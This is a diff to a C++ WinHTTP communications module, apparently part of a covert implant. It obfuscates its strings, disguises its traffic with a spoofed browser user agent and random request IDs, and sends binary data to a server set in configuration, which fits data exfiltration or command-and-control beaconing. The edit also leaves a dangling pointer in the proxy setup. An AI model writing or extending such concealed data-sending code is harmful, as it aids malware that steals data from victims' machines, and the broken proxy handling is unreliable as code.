@@ -15,8 +15,8 @@
 #pragma comment(lib, "winhttp.lib")
 
 // Obfuscated strings
-static const auto OBF_HTTP_COMMS = OBFUSCATE("HttpComms");
-static const auto OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+static const char* OBF_HTTP_COMMS = OBFUSCATE("HttpComms");
+static const char* OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
 HttpComms::HttpComms(Configuration* config)
     : m_config(config), m_hSession(NULL), m_hConnect(NULL) {}
@@ -26,22 +26,25 @@ HttpComms::~HttpComms() {
 }
 
 bool HttpComms::Initialize() {
-    std::wstring userAgent = std::wstring(OBF_USER_AGENT.begin(), OBF_USER_AGENT.end());
+    // Convert obfuscated C-string to wide string
+    std::wstring userAgent = utils::StringUtils::Utf8ToWide(OBF_USER_AGENT);
     
     DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
     LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
+    LPCWSTR proxyBypass = WINHTTP_NO_PROXY_BYPASS;
     
     if (m_config->GetUseProxy()) {
         accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-        std::string proxyStr = OBFUSCATE("http://proxy:8080");
-        // Convert to wide string if needed
+        const char* proxyStr = OBFUSCATE("http://proxy:8080");
+        proxyName = utils::StringUtils::Utf8ToWide(proxyStr).c_str();
+        // Note: You might need to handle proxy bypass if needed
     }
     
     m_hSession = WinHttpOpen(
         userAgent.c_str(),
         accessType,
         proxyName,
-        WINHTTP_NO_PROXY_BYPASS,
+        proxyBypass,
         0
     );
 
@@ -64,7 +67,7 @@ bool HttpComms::Initialize() {
     std::string url = m_config->GetServerUrl();
     
     // Convert to wide string for WinHTTP
-    std::wstring wUrl(url.begin(), url.end());
+    std::wstring wUrl = utils::StringUtils::Utf8ToWide(url);
     
     URL_COMPONENTS urlComp;
     ZeroMemory(&urlComp, sizeof(urlComp));
@@ -72,6 +75,7 @@ bool HttpComms::Initialize() {
     urlComp.dwSchemeLength = (DWORD)-1;
     urlComp.dwHostNameLength = (DWORD)-1;
     urlComp.dwUrlPathLength = (DWORD)-1;
+    urlComp.dwExtraInfoLength = (DWORD)-1;
 
     if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
         LOG_ERROR("Failed to parse server URL: " + std::to_string(GetLastError()));
@@ -123,7 +127,7 @@ bool HttpComms::SendData(const std::vector<uint8_t>& data) {
     std::string headers = "Content-Type: application/octet-stream\r\n";
     headers += "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16) + "\r\n";
     
-    std::wstring wHeaders(headers.begin(), headers.end());
+    std::wstring wHeaders = utils::StringUtils::Utf8ToWide(headers);
     
     if (!WinHttpAddRequestHeaders(
         hRequest,
@@ -139,7 +143,7 @@ bool HttpComms::SendData(const std::vector<uint8_t>& data) {
         hRequest,
         WINHTTP_NO_ADDITIONAL_HEADERS,
         0,
-        (LPVOID)data.data(),
+        const_cast<uint8_t*>(data.data()), // Remove const_cast if data is not const
         static_cast<DWORD>(data.size()),
         static_cast<DWORD>(data.size()),
         0
@@ -159,14 +163,18 @@ bool HttpComms::SendData(const std::vector<uint8_t>& data) {
     // Check response status
     DWORD statusCode = 0;
     DWORD size = sizeof(statusCode);
-    WinHttpQueryHeaders(
+    if (!WinHttpQueryHeaders(
         hRequest,
         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-        NULL,
+        WINHTTP_HEADER_NAME_BY_INDEX,
         &statusCode,
         &size,
-        NULL
-    );
+        WINHTTP_NO_HEADER_INDEX
+    )) {
+        LOG_ERROR("Failed to query HTTP status: " + std::to_string(GetLastError()));
+        WinHttpCloseHandle(hRequest);
+        return false;
+    }
 
     bool success = (statusCode >= 200 && statusCode < 300);
     if (!success) {
